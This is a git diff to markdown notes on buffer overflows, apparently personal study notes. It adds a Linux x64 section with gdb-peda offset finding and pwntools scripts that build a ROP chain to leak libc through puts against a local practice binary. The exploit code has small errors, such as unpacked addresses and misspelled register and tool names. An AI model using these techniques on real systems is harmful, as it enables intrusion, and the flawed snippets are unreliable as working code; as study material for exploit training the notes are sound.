@@ -140,14 +140,16 @@ Use checsec.sh to see what binary protections a file was compiled with (canaries
 
 ## Buffer Overflows
 
+### Basic Windows x86 Buffer Overflow
+
+Tools: Immunity Debugger, Python, Metasploit
+
 > Our aim: Overwrite the EIP/RIP register with the address of our shellcode
 
 Important Registers:
 1. EPB/RPB: register which points to base of the current the stack frame
 2. ESP/RSP: register which points to the top of the current stack frame
 3. EIP/RIP:  register which points to the next processor instruction
-
-### Basic Windows Buffer Overflows
 
 #### Use a script to reproduce the crash
 
@@ -294,6 +296,95 @@ try:
 
 except: 
     print "Could not connect" 
+```
+
+### Linux x64 Buffer Overflow
+
+Tools: GBD (peda), Python
+
+In 64 bit architecture, the rsp (register stack pointer) and rbp (register base pointer) registers are the focus.
+
+The program remembers its place in the stack with the rsp register. The rsp register will move up or down when things are pushed and popped from the stack. The rbp register store the bottom of the stacck.
+
+Unlike in x86, where arguments are passed as the next line on the stack, arguments are passed in registers in 64-bit programs. This means we will need to find a way to control the RDI register.
+
+#### Update notes on GOT AND PLT, maybe calling conventions
+
+#### Determine security features 
+
+```
+gdb vulnerable
+gdb-peda$ checksec
+
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+```
+
+#### Determine the Offsets
+
+```
+gdb-peda$ pattern create 300
+gdb-peda$ r
+*put pattern in overflow input*
+gdb-peda$ x/xg $rsp
+0x7ffe8d904528: 0x41416d4141514141
+gdb-peda$ pattern offset 0x41416d4141514141
+4702159612987654465 found at offset: 136
+```
+
+#### Write a script to reproduce crash
+
+We will use pwntools for interacting with the process, but for the purposes of these notes will not use the modules that automate much of this process.
+
+```
+from pwn import *
+
+context.binary = './vulnerable'
+p = process('./vulnerable', stdin=process.PTY)       #MAY NEED TO CHANGE STDIN/OUT args
+
+payload = "A" * 300
+
+print p.recvuntil(":")
+p.sendline(payload)
+print p.recvuntil(".")
+raw_input()          # so our script continues after the process crashes so we can see SEGFAULT
+```
+
+#### Find location of libc puts in vulnerable program
+
+```
+objdump -D garbage | grep puts
+0000000000401050 <puts@plt>:
+  401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
+```
+
+#### Find location of pop rdi gadget
+
+```
+# ROPgadget --binary garbage | grep "pop rdi" 
+```
+
+#### Update script to leak location of libc
+
+```
+from pwn import *
+
+context.binary = './vulnerable'
+p = process('./vulnerable', stdin=process.PTY)       #MAY NEED TO CHANGE STDIN/OUT args
+
+plt_put = 0x401050
+got_put = 0x404028
+pop_rdi = 0x40179b
+
+payload = "A" * 136 + pop_rdi + got_put + plt_put
+
+print p.recvuntil(":")
+p.sendline(payload)
+print p.recvuntil(".")
+raw_input()          # so our script continues after the process crashes so we can see SEGFAULT
 ```
 
 ### Disabling OS and Compiler Security
